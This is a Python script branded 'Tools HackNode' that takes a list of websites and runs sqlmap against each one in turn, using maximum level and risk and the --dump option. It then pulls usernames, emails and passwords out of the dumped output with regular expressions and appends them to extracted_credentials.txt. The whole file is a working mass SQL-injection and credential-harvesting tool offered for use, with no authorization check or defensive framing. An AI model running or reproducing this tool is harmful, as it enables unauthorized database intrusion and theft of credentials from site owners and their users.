import subprocess
import pyfiglet
import re
from time import sleep

def print_banner():
    # Display banner with title and information
    banner = pyfiglet.figlet_format("Tools HackNode", font="slant")
    print("\033[96m" + banner)  # Light Blue color
    print("\033[92mThis tool is exclusive to the HackNode team.")
    print("\033[94mChannel link: https://t.me/hacknode_1\n")
    print("\033[95m" + "=" * 80)
    print("\033[94m" + "This tool is exclusive to the HackNode team.".center(80))
    print("\033[94m" + "Channel link: https://t.me/hacknode_1".center(80))
    print("\033[95m" + "=" * 80 + "\n")

def exploit_sqlmap(url):
    try:
        # Run SQLmap command to check for SQL injection vulnerability
        print(f"\033[94mRunning SQLmap on {url}...\n")
        
        result = subprocess.run(
            ["sqlmap", "-u", url, "--batch", "--dump", "--level=5", "--risk=3", "--technique=BEUSTQ", "--dbs", "--output-dir=output", "--threads=10"],
            capture_output=True, text=True
        )
        
        # Check if SQLmap found any database and dumped data
        if "database" in result.stdout and "dumped" in result.stdout:
            print("\033[92mSQL Injection vulnerability found!")
            extract_admin_credentials(result.stdout, url)
        else:
            print(f"\033[91mNo SQL Injection vulnerability found at: {url}\n")
    
    except Exception as e:
        print(f"\033[91mError while running SQLmap on {url}: {e}")

def extract_admin_credentials(data, url):
    # Regular expressions to search for common username and password patterns
    username = None
    password = None
    
    # Look for common username/email and password patterns in the dump output
    username_match = re.search(r"(username|email)\s*=\s*['\"]?(\S+)['\"]?", data)
    password_match = re.search(r"(password)\s*=\s*['\"]?(\S+)['\"]?", data)

    if username_match and password_match:
        username = username_match.group(2)
        password = password_match.group(2)
        print(f"\033[92mCredentials found!\nUsername: {username}\nPassword: {password}\n")
        save_to_file(username, password, url)
    else:
        print(f"\033[91mNo valid admin credentials found for {url}")

def save_to_file(username, password, url):
    with open("extracted_credentials.txt", "a") as file:
        file.write(f"Site: {url}\n")
        file.write(f"Username: {username}\n")
        file.write(f"Password: {password}\n")
        file.write("=" * 50 + "\n\n")  # Add space between results
    print(f"\033[92mData saved for {url}\n")

def load_websites(filename):
    with open(filename, "r") as file:
        return [line.strip() for line in file.readlines()]

def main():
    print_banner()
    
    # Ask the user to input the file name for the list of websites
    list_file = input("Enter the name of the list file (e.g., list.txt): ").strip()
    
    try:
        websites = load_websites(list_file)
    except FileNotFoundError:
        print(f"\033[91mFile {list_file} not found. Please check the file path and try again.")
        return

    # Process each website in the list
    for site in websites:
        print(f"\033[96m\nTesting site: {site}\n")
        exploit_sqlmap(site)
        sleep(2)  # Wait between sites to avoid overloading the server

if __name__ == "__main__":
    main()
